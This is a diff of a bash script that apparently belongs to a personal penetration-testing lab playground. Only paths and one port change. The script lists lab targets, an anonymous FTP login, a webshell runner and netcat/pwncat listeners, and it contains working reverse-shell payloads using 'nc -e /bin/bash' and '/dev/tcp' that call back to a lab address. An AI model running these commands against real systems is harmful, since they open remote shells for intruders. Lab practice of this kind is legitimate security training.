@@ -1,6 +1,6 @@
 #!/bin/bash
 
-source "/home/kali/Projects/Black-Hat-Bash/pentest.sh"
+source "/home/kali/Projects/Black-Hat-Bash/SETUP/pentest.sh"
 
 # How to use:
 # bash /home/kali/Projects/Black-Hat-Bash/playground/playground.sh
@@ -13,7 +13,7 @@ source "/home/kali/Projects/Black-Hat-Bash/pentest.sh"
 # 172.16.10.11 (ftp)
 #   ftp ftp://anonymous:@172.16.10.11
 # 172.16.10.10:8081/upload
-#   bash playground/exercises/run_webshell_opt.sh 172.16.10.10:8081
+#   bash LAB-PLAYGROUND/exercises/run_webshell_opt.sh 172.16.10.10:8081
 #   pwncat-cs -l -p 2545
 #   nc -lvp 2545
 #   run webshell > cd uploads; bash run_rs.sh
@@ -49,6 +49,6 @@ pwncat-cs -l -p 1111
 
 # Run payload
 nohup nc 172.16.10.1 1111 -e /bin/bash &
-bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
+bash -c 'bash -i >& /dev/tcp/172.16.10.1/1111 0>&1'
 
 # Playground
